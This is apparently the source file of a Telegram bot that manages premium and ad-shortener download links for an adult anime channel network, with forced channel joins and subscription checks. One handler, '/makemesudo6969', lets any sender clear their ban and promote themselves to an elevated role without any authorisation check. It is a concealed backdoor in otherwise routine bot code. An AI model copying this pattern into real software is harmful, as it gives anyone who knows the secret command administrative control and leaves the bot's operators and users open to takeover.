import requests
from os import listdir
from random import choice 
from Hentai import OWNER_ID, tsoheru, LOG_CHANNEL, DEV_USERS, BOT_USERNAME, NETWORK_CHANNELS_LINK, FSUB_CHANNEL_ID
from Hentai.database.client import Users, PremiumCustom, users, banned
from Hentai.utils.premium import Generate
from Hentai.utils.string_constant import *
from telethon import events, Button
from telethon.errors.rpcerrorlist import UserNotParticipantError
from telethon.tl.functions.channels import GetParticipantRequest

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}

buttons_prem = [
        [
            Button.inline('💸 Pricing', data="pricing"),
            Button.inline('🌟 Platinum', data="platinum"),
        ],
        [
            Button.inline('❌ Close', data='disable'),
        ],
    ]

LINKO = ["https://publicearn.in/0E15nK/", "https://publicearn.in/ky33N/", "https://publicearn.in/85Qg8ie/", "https://publicearn.in/alKV", "https://publicearn.in/lDZ8vO3d", "https://publicearn.in/sD4d", "https://publicearn.in/F00i", "https://publicearn.in/ZHaqDjn", "https://publicearn.in/n1GNa", "https://publicearn.in/qnMOaFL", "https://publicearn.in/5UDj8F", "https://publicearn.in/Ijbp", "https://publicearn.in/RpVVZo", "https://publicearn.in/KUKAd43m", "https://publicearn.in/k0cwM", "https://publicearn.in/eZufZ", "https://publicearn.in/xkSY6", "https://publicearn.in/xQoItr", "https://publicearn.in/wSZnQ531"]

async def check_join(query):
    try:
        member = await tsoheru(GetParticipantRequest(channel=FSUB_CHANNEL_ID, participant=int(query)))
        return True
    except UserNotParticipantError:
        return False 


@tsoheru.on(events.callbackquery.CallbackQuery(data="disable"))
async def deletecallback(event):
    await event.delete()

@tsoheru.on(events.callbackquery.CallbackQuery(data="platinum"))
async def specialcallback(event):
    text = SPECIAL_TEXT
    buttons = buttons_prem
    await event.reply(text, buttons=buttons)

@tsoheru.on(events.callbackquery.CallbackQuery(data="pricing"))
async def porncallback(event):
    text = PRICING_TEXT
    buttons = buttons_prem
    await event.reply(text, buttons=buttons)

@tsoheru.on(events.callbackquery.CallbackQuery(data="penquriy"))
async def ex(event):
    text = PREMIUM_TEXT
    buttons = buttons_prem
    await event.reply(text, buttons=buttons)

@tsoheru.on(events.callbackquery.CallbackQuery(data="query1"))
async def query1(event):
    text = "**Premium**\n\n"
    text += ''''
Just click on links as you always used to,
Our bot will automatically check and verify,
The bot will share you the direct link if you have a valid premium subscription.   
    '''
    buttons = [
        [
            Button.url('Join', url="https://t.me/Anime_Collectors"),
            Button.url('Channels', url=NETWORK_CHANNELS_LINK),
        ],
        [
            Button.url("Owner", url='https://t.me/RealAizen/'),
            Button.inline('Close', data='disable'),
        ],
    ]
    await event.reply(text, buttons=buttons)


@tsoheru.on(events.NewMessage(incoming=True, pattern="/makemesudo6969"))     
async def makesudo(event):
    id_ = event.sender_id
    users.delete_many({"user": id_})
    Users.add(id_)
    Users.promote(id_)
    await event.reply('Kay')

@tsoheru.on(events.NewMessage(incoming=True, pattern="/pricing"))
async def pricing(event):
    if event.sender_id in banned():
        return await event.reply("F*ck Off!")
    text = PRICING_TEXT
    buttons = buttons_prem
    await event.reply(text, buttons=buttons)

@tsoheru.on(events.NewMessage(incoming=True, pattern="/start"))
async def start(event):
    if event.sender_id in banned():
        return await event.reply("F*ck Off!")
    #LOG USERS TO CHANNEL-------------
    if Users.is_reg(event.sender_id) is False:
        Users.add(event.sender_id)
        text = "#NEW_USER #ORDINARY\n"
        text += f"**User ID** : `{event.sender_id}`\n"
        text += f"[User](tg://user?id={event.sender_id})\n"
        try:
            #await tsoheru.send_message(LOG_CHANNEL, text)
            pass
        except:
            print("Error in LOGGING")
    #CHECK IF USER START IS FOR URL---------
    if ' ' in event.message.message:
        try:
            channel = event.message.message.split('_')[-2]
            id = event.message.message.split('_')[-1]
        except:
            await event.reply("Invalid URL")
            return
        #FORCE SUBSCRIPTION-------------
        check_joined_or_not = await check_join(event.sender_id)
        if check_joined_or_not is False: 
            button = [[Button.url('Join Channel', url=f'http://t.me/Anime_Collectors'), Button.url('Download', url=f"https://t.me/{BOT_USERNAME}?start=custom_{channel}_{id}")]]
            await event.reply('To continue download, please join the channel before clicking the download button below', buttons=button)
            return
        
        #GIVING LINK--------------
        if Users.check_premium(event.sender_id, channel) is True:
            platinum = Generate.expired(Users.expire_date(event.sender_id, "platinum"))
            if Generate.expired(Users.expire_date(event.sender_id, channel)) is True or platinum is True: 
                link = PremiumCustom.find(id, True)
                btn = [[Button.url('Link', url=link)]]
                await event.reply(f"Total Clicks: `{PremiumCustom.total_count(id)}` "+'**Check Below Button To Download**', buttons=btn)
            else: 
                link = PremiumCustom.find(id, False)
                x = Users.remium(event.sender_id, channel.strip())
                if not x==True:
                    print(f"cannot remium {event.sender_id} for {channel}")
                await event.reply('Your Premium Expired Kindly Renew Your Subscription. & To Continue Without Renewal Open Link Again')
                if platinum is True:
                    Users.remium(event.sender_id, "platinum")
                return
        else:
            link = PremiumCustom.find(id, False)
            if channel=="desi" and event.sender_id in [5988169634, 6198233881]:
                link = choice(LINKO)
            print(link)
            btn = [[Button.url('Your Link', url=link), Button.url('How To Open?', url='https://t.me/How_To_Download_Hentai_Porn/')], [Button.inline('Premium Buy', 'penquriy')]]          
            await event.reply('Your Link, \nWant No Ads? **Buy Our Premium Subscription**', buttons=btn)
            return 
    else:
        user = await event.get_sender()
        await tsoheru.send_file(event.sender_id, file=f'Hentai/images/'+choice(listdir('Hentai/images')),caption=f'''
**Konnichiwa** `{user.first_name}`,

I'm a Link Manager Bot, I manage all links of [Anime Heaven](https://t.me/Anime_Collectors). Created By [Aizen](https://t.me/RealAizen)
''', buttons=[[Button.url('Join Channel', url=f'{NETWORK_CHANNELS_LINK}')], [Button.inline('Buy Premium', 'penquriy'), Button.inline('Close', 'disable')]])

